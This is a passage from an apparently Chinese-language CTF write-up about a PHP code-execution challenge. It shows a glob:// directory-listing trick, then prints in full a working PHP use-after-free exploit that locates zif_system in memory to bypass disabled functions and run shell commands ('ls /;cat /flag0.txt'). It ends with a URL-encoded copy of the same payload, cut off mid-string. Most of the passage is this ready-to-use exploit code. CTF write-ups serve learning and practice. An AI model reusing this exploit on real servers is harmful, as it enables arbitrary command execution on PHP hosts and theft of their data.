class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>​		scandir 被禁了，这里没什么思路，不过，这里有大佬通过 glob 伪协议读取了根目录文件名：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span> <span class="variable">$f</span>.<span class="string">&quot;    &quot;</span> ;&#125;<span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#bin dev etc flag0.txt home lib media mnt opt proc root run sbin srv sys tmp usr var </span></span><br></pre></td></tr></table></figure>
<p>​		通过 include 读取文件的时候发现没有权限，先列一些读取文件的函数吧：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;example.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&quot;example.txt&quot;</span>));<span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$fileContents</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;example.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>​		之后就是利用 uaf 脚本进行命令执行了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%c&#x27;</span>,<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>​		直接贴一个 payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=%<span class="number">3</span>f%<span class="number">3</span>e%<span class="number">3</span>c%<span class="number">3</span>fphp%<span class="number">0</span>apwn(%<span class="number">22</span>ls+%<span class="number">2</span>f%<span class="number">3</span>bcat+%<span class="number">2</span>fflag0.txt%<span class="number">22</span>)%<span class="number">3</span>b%<span class="number">0</span>a%<span class="number">0</span>afunction+<span class="title function_ invoke__">pwn</span>(%<span class="number">24</span>cmd)+%<span class="number">7</span>b%<span class="number">0</span>a++++<span class="keyword">global</span>+%<span class="number">24</span>abc%<span class="number">2</span>c+%<span class="number">24</span>helper%<span class="number">2</span>c+%<span class="number">24</span>backtrace%<span class="number">3</span>b%<span class="number">0</span>a++++<span class="class"><span class="keyword">class</span>+<span class="title">Vuln</span>+%7<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+%24<span class="title">a</span>%3<span class="title">b</span>%0<span class="title">a</span>++++++++<span class="title">public</span>+<span class="title">function</span>+<span class="title">__destruct</span>()+%7<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">global</span>+%24<span class="title">backtrace</span>%3<span class="title">b</span>+%0<span class="title">a</span>++++++++++++<span class="title">unset</span>(%24<span class="title">this</span>-%3<span class="title">ea</span>)%3<span class="title">b</span>%0<span class="title">a</span>++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+(<span class="title">new</span>+<span class="title">Exception</span>)-%3<span class="title">egetTrace</span>()%3<span class="title">b</span>+%23+%3<span class="title">b</span>)%0<span class="title">a</span>++++++++++++<span class="title">if</span>(!<span class="title">isset</span>(%24<span class="title">backtrace</span>%5<span class="title">b1</span>%5<span class="title">d</span>%5<span class="title">b</span>%27<span class="title">args</span>%27%5<span class="title">d</span>))+%7<span class="title">b</span>+%23+<span class="title">PHP</span>+%3<span class="title">e</span>%3<span class="title">d</span>+7.4%0<span class="title">a</span>++++++++++++++++%24<span class="title">backtrace</span>+%3<span class="title">d</span>+<span class="title">debug_backtrace</span>()%3<span class="title">b</span>%0<span 